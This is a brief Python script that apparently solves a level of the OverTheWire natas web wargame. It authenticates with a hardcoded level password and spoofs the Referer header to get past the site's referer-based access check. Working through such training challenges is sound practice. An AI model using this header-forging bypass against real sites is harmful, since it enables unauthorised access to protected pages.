import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer  = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ')
s.headers.update({'referer': referer})
r = s.get(url)

print(r.text)